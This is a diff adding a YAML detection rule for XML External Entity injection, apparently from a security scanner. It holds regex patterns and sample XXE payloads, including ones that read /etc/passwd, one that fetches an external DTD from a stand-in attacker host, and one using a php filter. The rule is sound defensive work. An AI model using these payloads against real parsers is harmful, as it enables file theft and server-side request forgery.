@@ -1,0 +1,43 @@
+version: 1.0.0
+rule_id: cmd-203
+family: CMD
+sub_family: xxe_injection
+name: XML External Entity (XXE) Injection Detection
+description: Detects XXE injection attempts in XML payloads
+severity: critical
+confidence: 0.97
+patterns:
+- pattern: '(?i)<!ENTITY\s+\w+\s+SYSTEM\s+["''](?:file|http|ftp|gopher|php|expect|data):'
+  flags:
+  - IGNORECASE
+  timeout: 5.0
+- pattern: (?i)<!DOCTYPE.*\[.*<!ENTITY.*SYSTEM
+  flags:
+  - IGNORECASE
+  - DOTALL
+  timeout: 5.0
+examples:
+  should_match:
+  - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
+  - "<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>"
+  - "<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>"
+  should_not_match:
+  - "What is XXE vulnerability?"
+  - "How to prevent XXE attacks?"
+  - "XML parsing best practices"
+metrics:
+  precision: null
+  recall: null
+  f1_score: null
+  last_evaluated: null
+mitre_attack:
+- T1059
+metadata:
+  created: '2025-11-16'
+  updated: '2025-11-16'
+  author: raxe-ce
+  category: web_attacks
+rule_hash: null
+risk_explanation: XML External Entity (XXE) attacks exploit XML parsing to read files, perform SSRF attacks, or cause denial of service. XXE can expose sensitive data, enable internal network scanning, or consume excessive system resources.
+remediation_advice: Disable external entity processing in XML parsers. Use safe XML parsing configurations. Implement input validation for XML content. Deploy XXE-specific detection and blocking. Consider using safer data formats like JSON.
+docs_url: https://github.com/raxe-ai/raxe-ce/wiki/CMD-203-Xml-External-Entity-(Xxe)
